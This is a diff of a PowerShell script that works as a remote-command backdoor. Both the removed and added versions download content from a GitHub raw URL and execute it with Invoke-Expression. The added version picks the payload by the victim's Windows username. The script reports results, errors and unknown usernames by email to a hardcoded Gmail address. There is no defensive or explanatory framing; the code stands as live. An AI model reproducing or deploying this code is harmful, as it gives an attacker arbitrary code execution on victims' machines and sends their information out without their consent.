@@ -14,17 +14,36 @@ function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
     $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
     $smtp.send($message);
  }
-$url = "https://raw.githubusercontent.com/4V4loon/tools/master/update"
-$contentLocal = "False"
-$contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
-$diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
-if($diff) {
-     try {
-          Invoke-Expression $contentWeb -ErrorAction Stop
-          Send-ToEmail -email "xelil.isi007@gmail.com" -body $contentWeb -subj "Done"
-     } catch {
-          $err = $_ | Out-String
-          write-host $err
-          Send-ToEmail -email "xelil.isi007@gmail.com" -body $err -subj "Error"
-     }
+ 
+ function Get-UrlStatusCode([string] $Url)
+{
+    try
+    {
+        (Invoke-WebRequest -Uri $Url -UseBasicParsing -DisableKeepAlive).StatusCode
+    }
+    catch [Net.WebException]
+    {
+        [int]$_.Exception.Response.StatusCode
+    }
 }
+$name = $env:username
+$url = "https://raw.githubusercontent.com/4V4loon/tools/master/ctwo/$name"
+$statusCode = Get-UrlStatusCode $url
+if ($statusCode -eq 200){
+    $contentLocal = "False"
+    $contentWeb = Invoke-WebRequest -Uri $url -UseBasicParsing | select -ExpandProperty Content
+    $diff = Compare-Object -ReferenceObject $($contentLocal) -DifferenceObject $($contentWeb)
+    if($diff) {
+        try {
+            Invoke-Expression $contentWeb -ErrorAction Stop
+            if($?){Send-ToEmail -email "xelil.isi007@gmail.com" -body $contentWeb -subj "Done"}
+        } catch {
+            $err = $_ | Out-String
+            write-host $err
+            Send-ToEmail -email "xelil.isi007@gmail.com" -body $err -subj "Error"
+        }
+    }
+} else {
+    Send-ToEmail -email "xelil.isi007@gmail.com" -body $name -subj "UserNotFound"
+}
+
